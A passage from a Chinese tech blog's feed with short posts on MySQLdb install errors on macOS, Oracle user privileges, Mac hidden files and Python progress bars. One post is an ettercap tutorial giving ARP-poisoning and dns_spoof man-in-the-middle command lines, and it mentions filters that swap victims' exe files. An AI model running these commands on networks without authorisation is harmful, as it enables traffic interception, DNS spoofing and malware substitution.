<p>首先,下载MySQLdb:<a href="http://sourceforge.net/projects/mysql-python/" target="_blank" rel="external">http://sourceforge.net/projects/mysql-python/</a>,截至目前,也就是2014-1-14,目前版本<code>1.2.4</code>,下载完成后:<br>    tar -xzvf MySQL-python-1.2.4.tar.gz<br>    python setup.py install  </p>
<h3 id="解决错误">解决错误</h3>
<p>标准的安装过程就是上诉这样,但实际会出现几个问题:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Traceback (most recent call last):</div><div class="line">  File <span class="string">"setup.py"</span>, line <span class="number">15</span>, <span class="keyword">in</span> &lt;module&gt;</div><div class="line">    metadata, options = get_config()</div><div class="line">  File <span class="string">"/Users/***/Downloads/MySQL-python-1.2.3/setup_posix.py"</span>, line <span class="number">43</span>, <span class="keyword">in</span> get_config</div><div class="line">    libs = mysql_config(<span class="string">"libs_r"</span>)</div><div class="line">  File <span class="string">"/Users/***/Downloads/MySQL-python-1.2.3/setup_posix.py"</span>, line <span class="number">24</span>, <span class="keyword">in</span> mysql_config</div><div class="line">    <span class="keyword">raise</span> EnvironmentError(<span class="string">"%s not found"</span> % (mysql_config.path,))</div><div class="line">EnvironmentError: mysql_config <span class="keyword">not</span> found</div></pre></td></tr></table></figure>

<p><code>mysql_config</code>没找到,<code>mysql_config</code>是位于MySQL目录下的bin文件夹里面的,具体用来做什么我也不清楚,但看文件名,大概知道是用来配置mysql的,目测应该是环境变量的问题,在网上查询了下资料,按照网上的说法,可以通过修改MySQL-python安装目录下的<code>site.cfg</code>文件来进行修改.</p>
<a id="more"></a>

<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql_config = <span class="regexp">/usr/local</span><span class="regexp">/mysql/bin</span><span class="regexp">/mysql_config</span></div></pre></td></tr></table></figure>


<p>去掉前面的<code>#</code>号后,修改好配置保存..安装就能一路正常下去了.<br>如果你用pip来进行安装.可以尝试用软链接的形式链接到/usr/bin下,或者设置环境变量,都可以正常的安装<br>等安装完毕后,问题又出现了:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">Python <span class="number">2.7</span><span class="number">.5</span> (default, Aug <span class="number">25</span> <span class="number">2013</span>, <span class="number">00</span>:<span class="number">04</span>:<span class="number">04</span>)</div><div class="line">[GCC <span class="number">4.2</span><span class="number">.1</span> Compatible Apple LLVM <span class="number">5.0</span> (clang-<span class="number">500.0</span><span class="number">.68</span>)] on darwin</div><div class="line">Type <span class="string">"help"</span>, <span class="string">"copyright"</span>, <span class="string">"credits"</span> <span class="keyword">or</span> <span class="string">"license"</span> <span class="keyword">for</span> more information.</div><div class="line"><span class="prompt">&gt;&gt;&gt; </span><span class="keyword">import</span> MySQLdb</div><div class="line">/Library/Python/<span class="number">2.7</span>/site-packages/MySQL_python-<span class="number">1.2</span><span class="number">.3</span>-py2<span class="number">.7</span>-macosx-<span class="number">10.7</span>-intel.egg/_mysql.py:<span class="number">3</span>: UserWarning: Module _mysql was already imported <span class="keyword">from</span> /Library/Python/<span class="number">2.7</span>/site-packages/MySQL_python-<span class="number">1.2</span><span class="number">.3</span>-py2<span class="number">.7</span>-macosx-<span class="number">10.7</span>-intel.egg/_mysql.pyc, but /Users/***/Downloads/MySQL-python-<span class="number">1.2</span><span class="number">.3</span></div><div class="line"> <span class="keyword">is</span> being added to sys.path</div><div class="line">Traceback (most recent call last):</div><div class="line">  File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</div><div class="line">  File <span class="string">"MySQLdb/__init__.py"</span>, line <span class="number">19</span>, <span class="keyword">in</span> &lt;module&gt;</div><div class="line">    <span class="keyword">import</span> _mysql</div><div class="line">  File <span class="string">"build/bdist.macosx-10.7-intel/egg/_mysql.py"</span>, line <span class="number">7</span>, <span class="keyword">in</span> &lt;module&gt;</div><div class="line">  File <span class="string">"build/bdist.macosx-10.7-intel/egg/_mysql.py"</span>, line <span class="number">6</span>, <span class="keyword">in</span> __bootstrap__</div><div class="line">ImportError: dlopen(/Users/***/.python-eggs/MySQL_python-<span class="number">1.2</span><span class="number">.3</span>-py2<span class="number">.7</span>-macosx-<span class="number">10.7</span>-intel.egg-tmp/_mysql.so, <span class="number">2</span>): Library <span class="keyword">not</span> loaded: libmysqlclient<span class="number">.18</span>.dylib</div><div class="line">  Referenced <span class="keyword">from</span>: /Users/***/.python-eggs/MySQL_python-<span class="number">1.2</span><span class="number">.3</span>-py2<span class="number">.7</span>-macosx-<span class="number">10.7</span>-intel.egg-tmp/_mysql.so</div><div class="line">  Reason: image <span class="keyword">not</span> found</div></pre></td></tr></table></figure>

<p>又是一个<code>not found</code>,继续在网上找资料,大部分博客都是这样解决的(引入动态变量,重编译,设置好环境变量):</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">sudo <span class="keyword">python</span> setup.<span class="keyword">py</span> clean</div><div class="line">sudo <span class="keyword">python</span> setup.<span class="keyword">py</span> build</div><div class="line">sudo <span class="keyword">python</span> setup.<span class="keyword">py</span> install</div><div class="line">export DYLD_LIBRARY_PATH=/usr/local/mysql/li<span class="variable">b:</span>$DYLD_LIBRARY_PATH</div></pre></td></tr></table></figure>

<p>但是这样做后,发现还是不行.Django在syndb的时候还是会报错,发现<a href="http://www.cnblogs.com/ifantastic/archive/2013/04/13/3017677.html" target="_blank" rel="external">iFantasticMe的博客</a>,解决办法有所不同,尝试之,发现成功了:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sudo ln -s <span class="regexp">/usr/</span>local<span class="regexp">/mysql/</span>lib<span class="regexp">/libmysqlclient.18.dylib /</span>usr<span class="regexp">/lib/</span>libmysqlclient.<span class="number">18</span>.dylib</div><div class="line">sudo ln -s <span class="regexp">/usr/</span>local<span class="regexp">/mysql/</span>lib <span class="regexp">/usr/</span>local<span class="regexp">/mysql/</span>lib<span class="regexp">/mysql</span></div></pre></td></tr></table></figure>

<p>感觉依然还是可以用添加环境变量来解决吧,最后感谢这些愿意分享出错解决办法的人们.</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>MySQLdb是<code>Python</code>连接MySQL的模块,在安装过程中,遇到了点小麻烦,特地记录了下来…  </p>
<h3 id="安装过程">安装过程</h3>
<p>首先,下载MySQLdb:<a href="http://sourceforge.net/projects/mysql-python/" target="_blank" rel="external">http://sourceforge.net/projects/mysql-python/</a>,截至目前,也就是2014-1-14,目前版本<code>1.2.4</code>,下载完成后:<br>    tar -xzvf MySQL-python-1.2.4.tar.gz<br>    python setup.py install  </p>
<h3 id="解决错误">解决错误</h3>
<p>标准的安装过程就是上诉这样,但实际会出现几个问题:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Traceback (most recent call last):</div><div class="line">  File <span class="string">"setup.py"</span>, line <span class="number">15</span>, <span class="keyword">in</span> &lt;module&gt;</div><div class="line">    metadata, options = get_config()</div><div class="line">  File <span class="string">"/Users/***/Downloads/MySQL-python-1.2.3/setup_posix.py"</span>, line <span class="number">43</span>, <span class="keyword">in</span> get_config</div><div class="line">    libs = mysql_config(<span class="string">"libs_r"</span>)</div><div class="line">  File <span class="string">"/Users/***/Downloads/MySQL-python-1.2.3/setup_posix.py"</span>, line <span class="number">24</span>, <span class="keyword">in</span> mysql_config</div><div class="line">    <span class="keyword">raise</span> EnvironmentError(<span class="string">"%s not found"</span> % (mysql_config.path,))</div><div class="line">EnvironmentError: mysql_config <span class="keyword">not</span> found</div></pre></td></tr></table></figure>

<p><code>mysql_config</code>没找到,<code>mysql_config</code>是位于MySQL目录下的bin文件夹里面的,具体用来做什么我也不清楚,但看文件名,大概知道是用来配置mysql的,目测应该是环境变量的问题,在网上查询了下资料,按照网上的说法,可以通过修改MySQL-python安装目录下的<code>site.cfg</code>文件来进行修改.</p>
]]>
    
    </summary>
    
      <category term="python" scheme="https://sqzr.cc/tags/python/"/>
    
      <category term="mysql" scheme="https://sqzr.cc/tags/mysql/"/>
    
      <category term="mac" scheme="https://sqzr.cc/tags/mac/"/>
    
      <category term="编程" scheme="https://sqzr.cc/categories/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[oracle学习笔记 - 用户管理]]></title>
    <link href="https://sqzr.cc//blog/2014/01/02/oraclexue-xi-bi-ji-yong-hu-guan-li/"/>
    <id>https://sqzr.cc//blog/2014/01/02/oraclexue-xi-bi-ji-yong-hu-guan-li/</id>
    <published>2014-01-02T14:19:00.000Z</published>
    <updated>2014-10-30T13:32:12.000Z</updated>
    <content type="html"><![CDATA[<h2 id="添加用户">添加用户</h2>
<p>基础语句:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="operator"><span class="keyword">create</span> <span class="keyword">user</span> username <span class="keyword">identified</span> <span class="keyword">by</span> <span class="keyword">password</span>;</span></div></pre></td></tr></table></figure>

<p>命令详解:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="operator"><span class="keyword">create</span> <span class="keyword">user</span>  为基本语法</span></div><div class="line">username    为用户名</div><div class="line"><span class="keyword">identified</span> <span class="keyword">by</span> 为基础语句,表示为用户设立新密码.密码必须由字母开头</div></pre></td></tr></table></figure>

<a id="more"></a>

<hr>
<h2 id="修改密码">修改密码</h2>
<p>如果修改目前<code>登陆的</code>用户的密码可以使用:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">password</div></pre></td></tr></table></figure>

<p>dba用户,或者是具有alter user权限的系统用户,可以使用:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="operator"><span class="keyword">alter</span> <span class="keyword">user</span> username <span class="keyword">identified</span> <span class="keyword">by</span> <span class="keyword">password</span>;</span></div></pre></td></tr></table></figure>

<hr>
<h2 id="删除用户">删除用户</h2>
<p>一般以用dba权限用户或者具有drop user权限的用户来进行删除,无法<code>自己删除自己</code>,在删除用户时,如果删除的用户已经<code>创建有表</code>,那么就需要在删除的时候带上<code>cascade</code>参数:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="operator"><span class="keyword">drop</span> <span class="keyword">user</span> username [<span class="keyword">cascade</span>]</span></div></pre></td></tr></table></figure>

<p>命令详解:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="operator"><span class="keyword">drop</span> <span class="keyword">user</span> 删除用户基础语法</span></div><div class="line"><span class="keyword">cascade</span> 参数 删除用户以及被删除用户所创建的表</div></pre></td></tr></table></figure>

<hr>
<h2 id="基础权限概念">基础权限概念</h2>
<ul>
<li>系统权限:值用户对数据库的相关权限,比如建表修改表</li>
<li>对象权限:用户对其他用户的数据对象访问的权限,比如创建的表 触发器 视图<ul>
<li>select</li>
<li>insert</li>
<li>update</li>
<li>delete</li>
<li>all</li>
<li>crate index</li>
<li>….</li>
</ul>
</li>
<li>角色概念:一个角色包含几个权限,为了方便赋予权限<ul>
<li>自定义角色:自定义角色</li>
<li>预定义角色:oracle预设角色<ul>
<li>connect角色:连接权限</li>
<li>resourceq角色:在表空间创表</li>
<li>dba角色:超级管理员</li>
</ul>
</li>
</ul>
</li>
</ul>
<hr>
<h2 id="对权限的维护">对权限的维护</h2>
<hr>
<h2 id="权限实例">权限实例</h2>
<p>给用户赋予连接权限:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="operator"><span class="keyword">grant</span> <span class="keyword">connect</span> <span class="keyword">to</span> username;</span></div></pre></td></tr></table></figure>

<p>赋予一个用户查询某表的权限(对象权限,只允许查询emp表权限):</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="operator"><span class="keyword">grant</span> <span class="keyword">select</span> <span class="keyword">on</span> emp <span class="keyword">to</span> username;</span></div></pre></td></tr></table></figure>

<p>赋予一个用户建表的权限:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="operator"><span class="keyword">grant</span> resourceq <span class="keyword">to</span> username;</span></div></pre></td></tr></table></figure>

<p>收回对emp表的查询权限:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">revoke <span class="operator"><span class="keyword">select</span> <span class="keyword">on</span> emp <span class="keyword">from</span> username;</span></div></pre></td></tr></table></figure>

<hr>
<h2 id="词汇记录">词汇记录</h2>
<ul>
<li>create 创建</li>
<li>identified 被识别的</li>
<li>cascade 参数 删除用户以及被删除用户所创建的表</li>
<li>grant 赋予权限</li>
<li>revoke 收回权限</li>
</ul>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="添加用户">添加用户</h2>
<p>基础语句:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="operator"><span class="keyword">create</span> <span class="keyword">user</span> username <span class="keyword">identified</span> <span class="keyword">by</span> <span class="keyword">password</span>;</span></div></pre></td></tr></table></figure>

<p>命令详解:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="operator"><span class="keyword">create</span> <span class="keyword">user</span>  为基本语法</span></div><div class="line">username    为用户名</div><div class="line"><span class="keyword">identified</span> <span class="keyword">by</span> 为基础语句,表示为用户设立新密码.密码必须由字母开头</div></pre></td></tr></table></figure>

]]>
    
    </summary>
    
      <category term="oracle" scheme="https://sqzr.cc/tags/oracle/"/>
    
      <category term="编程" scheme="https://sqzr.cc/categories/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[ettercap 中文文档]]></title>
    <link href="https://sqzr.cc//blog/2013/12/28/ettercap-zhong-wen-wen-dang/"/>
    <id>https://sqzr.cc//blog/2013/12/28/ettercap-zhong-wen-wen-dang/</id>
    <published>2013-12-28T05:21:00.000Z</published>
    <updated>2014-10-30T13:37:29.000Z</updated>
    <content type="html"><![CDATA[<p>ettercap软件是一套举世闻名的软件，被广发使用与MITM攻击。在网络上已经有非常多的资料了,但都太乱..太杂,导致很多人都无法入手这软件,特别是在命令行下的操作..当初我也是因为如此,才没掌握好这软件..重新学习并且整理了下这软件的资料。<br>测试环境:<code>Mac os x 10.9</code><br>ettercap版本:<code>0.7.6</code> (brew默认安装的版本,我觉得这版本很稳定)<br><a id="more"></a></p>
<hr>
<h2 id="基础使用">基础使用</h2>
<p>先分享几个比较常用的命令:  </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">sudo ettercap -<span class="literal">T</span> -q -M ARP -i en0 /<span class="number">192.168</span><span class="number">.0</span><span class="number">.250</span>/ /<span class="number">192.168</span><span class="number">.0</span><span class="number">.1</span>/  <span class="comment"># 对250主机进行arp嗅探,250代表目标主机,1代表路由器地址</span></div><div class="line">sudo ettercap -<span class="literal">T</span> -q -M ARP -i en0 // // 						 <span class="comment"># 对所有的内网进行嗅探</span></div><div class="line">sudo ettercap -<span class="literal">T</span> -q -M ARP -P dns_spoof -<span class="literal">F</span> reple.ef // //        <span class="comment"># 使用插件以及脚本</span></div></pre></td></tr></table></figure>

<p><code>简单大概</code>的介绍下以上用到的参数详细意思(英语单词只是我个人联想的,感觉比较帮助记忆参数意思.):  </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">-<span class="ruby"><span class="constant">T</span> text   使用基于文本界面</span></div><div class="line">-<span class="ruby">q quiet  使用安静模式,如果不用此参数,则arp嗅探到的数据都会回显到屏幕上,推荐启用</span></div><div class="line">-<span class="ruby"><span class="constant">M</span> mitm   使用mitm模式</span></div><div class="line">-<span class="ruby"><span class="constant">P</span> plugin 选择插件,也可以在运行途中动态加载</span></div><div class="line">-<span class="ruby"><span class="constant">F</span> filter 选择过滤规则.可以自己写,比如实现网页替换 查找 读取内容的一些功能,在渗透中也比较常用..比如替换别人的exe文件.替换所有图片</span></div></pre></td></tr></table></figure>

<hr>
<h2 id="参数详解">参数详解</h2>
<p>嗅探以及攻击参数:  </p>
<ul>
<li>-o —only-mitm 不进行嗅探,只执行mitm攻击.只用ettercap做一个中间人,而用其他软件进行嗅探可以使用此参数</li>
<li>….待更新</li>
</ul>
]]></content>
    <summary type="html">
    <![CDATA[<p>ettercap软件是一套举世闻名的软件，被广发使用与MITM攻击。在网络上已经有非常多的资料了,但都太乱..太杂,导致很多人都无法入手这软件,特别是在命令行下的操作..当初我也是因为如此,才没掌握好这软件..重新学习并且整理了下这软件的资料。<br>测试环境:<code>Mac os x 10.9</code><br>ettercap版本:<code>0.7.6</code> (brew默认安装的版本,我觉得这版本很稳定)<br>]]>
    
    </summary>
    
      <category term="神器" scheme="https://sqzr.cc/tags/%E7%A5%9E%E5%99%A8/"/>
    
      <category term="渗透" scheme="https://sqzr.cc/categories/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Mac os X 系统显示隐藏文件的办法]]></title>
    <link href="https://sqzr.cc//blog/2013/12/24/mac-os-x-xi-tong-xian-shi-yin-cang-wen-jian-de-ban-fa/"/>
    <id>https://sqzr.cc//blog/2013/12/24/mac-os-x-xi-tong-xian-shi-yin-cang-wen-jian-de-ban-fa/</id>
    <published>2013-12-24T10:06:00.000Z</published>
    <updated>2014-10-30T13:37:55.000Z</updated>
    <content type="html"><![CDATA[<p>对于首次使用 <code>Mac</code> 系统的朋友来说，可能会有点稍微有点不适应，那就是 OS X 里并没有显示和隐藏文件的菜单或者设置。然而，其实在苹果 Mac OS X 操作系统下，隐藏文件是否显示有很多种设置方法，最简单的要算在 Mac 终端输入命令。  </p>
<hr>
<p>打开终端,输入以下命令:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">显示/隐藏Mac隐藏文件命令如下(注意其中的空格)：</div><div class="line">显示Mac隐藏文件的命令：defaults write com.apple.finder AppleShowAllFiles -<span class="keyword">bool</span> <span class="keyword">true</span> && killall Finder</div><div class="line">隐藏Mac隐藏文件的命令：defaults write com.apple.finder AppleShowAllFiles -<span class="keyword">bool</span> <span class="keyword">false</span> && killall Finder</div></pre></td></tr></table></figure>

<p>注意最后的<code>killall Finder</code>,表示结束<code>Finder</code>,结束后os x默认会重启这个东西…在打开文件夹,就已经将隐藏的文件显示出来了.<br><a id="more"></a></p>
<hr>
<p>注意:开启显示隐藏文件后,每个目录都会有一个<code>.DS_Store</code>文件,删除后会在生成的..摘自wikipedia的介绍<a href="http://zh.wikipedia.org/wiki/.DS_Store" target="_blank" rel="external">详细介绍</a>:<br>    .DS_Store (英文全称 Desktop Services Store)[1] 是一种由苹果公司的Mac OS X操作系统所创造的隐藏文件，目的在于存贮文件夹的自定义属性，例如文件们的图标位置或者是背景色的选择。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>对于首次使用 <code>Mac</code> 系统的朋友来说，可能会有点稍微有点不适应，那就是 OS X 里并没有显示和隐藏文件的菜单或者设置。然而，其实在苹果 Mac OS X 操作系统下，隐藏文件是否显示有很多种设置方法，最简单的要算在 Mac 终端输入命令。  </p>
<hr>
<p>打开终端,输入以下命令:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">显示/隐藏Mac隐藏文件命令如下(注意其中的空格)：</div><div class="line">显示Mac隐藏文件的命令：defaults write com.apple.finder AppleShowAllFiles -<span class="keyword">bool</span> <span class="keyword">true</span> && killall Finder</div><div class="line">隐藏Mac隐藏文件的命令：defaults write com.apple.finder AppleShowAllFiles -<span class="keyword">bool</span> <span class="keyword">false</span> && killall Finder</div></pre></td></tr></table></figure>

<p>注意最后的<code>killall Finder</code>,表示结束<code>Finder</code>,结束后os x默认会重启这个东西…在打开文件夹,就已经将隐藏的文件显示出来了.<br>]]>
    
    </summary>
    
      <category term="mac" scheme="https://sqzr.cc/tags/mac/"/>
    
      <category term="折腾" scheme="https://sqzr.cc/categories/%E6%8A%98%E8%85%BE/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Python中如何写控制台进度条的整理]]></title>
    <link href="https://sqzr.cc//blog/2013/12/21/pythonzhong-ru-he-xie-kong-zhi-tai-jin-du-tiao-de-zheng-li/"/>
    <id>https://sqzr.cc//blog/2013/12/21/pythonzhong-ru-he-xie-kong-zhi-tai-jin-du-tiao-de-zheng-li/</id>
    <published>2013-12-21T13:32:00.000Z</published>
    <updated>2014-10-30T13:30:28.000Z</updated>
    <content type="html"><![CDATA[<p>在Python写命令行程序中,常会用到进度条,比如下载的进度条,爬虫的进度条…然而对于一些常用的python界面库,都是有进度条组件.比如<code>pyqt</code>,<code>Tkinter</code>,<code>GTK</code>。<br>python有丰富的lib可以完成各种功能,想要做到命令行进度条,可以用<a href="http://pypi.python.org/pypi/progressbar/" target="_blank" rel="external">progressbar</a>类，使用<code>easy_install</code>可以方便的安装这可个类库，其实就一个文件，拿过来放到文件同一个目录下面也直接可以import过来.整理了一下用python自带库和第三方库实现的办法：<br><a id="more"></a></p>
<hr>
<h2 id="通过自带库实现">通过自带库实现</h2>
<p>进度条和一般的print区别在哪里呢？<br>答案就是print会输出一个<code>\n</code>，也就是换行符，这样光标移动到了下一行行首，接着输出，之前已经通过<code>stdout</code>输出的东西依旧保留，而且保证我们在下面看到最新的输出结果。<br>进度条不然，我们必须再原地输出才能保证他是一个进度条，否则换行了怎么还叫进度条？<br>最简单的办法就是，再输出完毕后，把光标移动到行首，继续在那里输出更长的进度条即可实现，新的更长的进度条把旧的短覆盖，就形成了动画效果。<br>可以想到那个转义符了吧，那就是 <code>\r</code>。<br>转义符\r就可以把光标移动到行首而不换行，转义符\n就把光标移动到行首并且换行。<br>在python中，输出<code>stdout</code>(标准输出)可以使用<code>sys.stdout.write</code>  </p>
<figure class="highlight Python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding=utf-8 -*-</span></div><div class="line"><span class="comment">#Using GPL v2</span></div><div class="line"><span class="comment">#Author: ihipop@gmail.com</span></div><div class="line"><span class="comment">##2010-10-27 22:07</span></div><div class="line"><span class="string">"""</span></div><div class="line">Usage:</div><div class="line">Just A Template</div><div class="line">"""</div><div class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> division</div><div class="line"><span class="keyword">import</span> sys,time</div><div class="line">j = <span class="string">'#'</span></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">61</span>):</div><div class="line">        j += <span class="string">'#'</span></div><div class="line">        sys.stdout.write(str(int((i/<span class="number">60</span>)*<span class="number">100</span>))+<span class="string">'%  ||'</span>+j+<span class="string">'-&gt;'</span>+<span class="string">"\r"</span>)</div><div class="line">        sys.stdout.flush()</div><div class="line">        time.sleep(<span class="number">0.5</span>)</div><div class="line"><span class="keyword">print</span></div></pre></td></tr></table></figure>

<hr>
<p>第二种思路是用转义符<code>\b</code><br>转义符<code>\b</code>是退格键，也就是说把输出的光标往回退格子，这样就可以不用+=了，例如：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding=utf-8 -*-</span></div><div class="line"><span class="comment">#Using GPL v2</span></div><div class="line"><span class="comment">#Author: ihipop@gmail.com</span></div><div class="line"><span class="comment">#2010-10-27 22:07</span></div><div class="line"><span class="string">"""</span></div><div class="line">Usage:</div><div class="line">Just A Template</div><div class="line">"""</div><div class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> division</div><div class="line"><span class="keyword">import</span> sys,time</div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">61</span>):</div><div class="line">        sys.stdout.write(<span class="string">'#'</span>+<span class="string">'-&gt;'</span>+<span class="string">"\b\b"</span>)</div><div class="line">        sys.stdout.flush()</div><div class="line">        time.sleep(<span class="number">0.5</span>)</div><div class="line"><span class="keyword">print</span></div></pre></td></tr></table></figure>

<hr>
<h2 id="通过progressbar库实现">通过progressbar库实现</h2>
<p>一个基本示范:  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding=utf-8 -*-</span></div><div class="line"><span class="comment">#Using GPL v2</span></div><div class="line"><span class="comment">#Author: ihipop@gmail.com</span></div><div class="line"><span class="comment">#2010-10-30 13:59</span></div><div class="line"><span class="string">"""</span></div><div class="line">Usage:</div><div class="line">Just A Template</div><div class="line">"""</div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">progressbarClass</span>:</span> </div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, finalcount, progresschar=None)</span>:</span></div><div class="line">        <span class="keyword">import</span> sys</div><div class="line">        self.finalcount=finalcount</div><div class="line">        self.blockcount=<span class="number">0</span></div><div class="line">        <span class="comment">#</span></div><div class="line">        <span class="comment"># See if caller passed me a character to use on the</span></div><div class="line">        <span class="comment"># progress bar (like "*").  If not use the block</span></div><div class="line">        <span class="comment"># character that makes it look like a real progress</span></div><div class="line">        <span class="comment"># bar.</span></div><div class="line">        <span class="comment">#</span></div><div class="line">        <span class="keyword">if</span> <span class="keyword">not</span> progresschar: self.block=chr(<span class="number">178</span>)</div><div class="line">        <span class="keyword">else</span>:                self.block=progresschar</div><div class="line">        <span class="comment">#</span></div><div class="line">        <span class="comment"># Get pointer to sys.stdout so I can use the write/flush</span></div><div class="line">        <span class="comment"># methods to display the progress bar.</span></div><div class="line">        <span class="comment">#</span></div><div class="line">        self.f=sys.stdout</div><div class="line">        <span class="comment">#</span></div><div class="line">        <span class="comment"># If the final count is zero, don't start the progress gauge</span></div><div class="line">        <span class="comment">#</span></div><div class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.finalcount : <span class="keyword">return</span></div><div class="line">        self.f.write(<span class="string">'\n------------------- % Progress -------------------\n'</span>)</div><div class="line">        <span class="keyword">return</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">progress</span><span class="params">(self, count)</span>:</span></div><div class="line">        <span 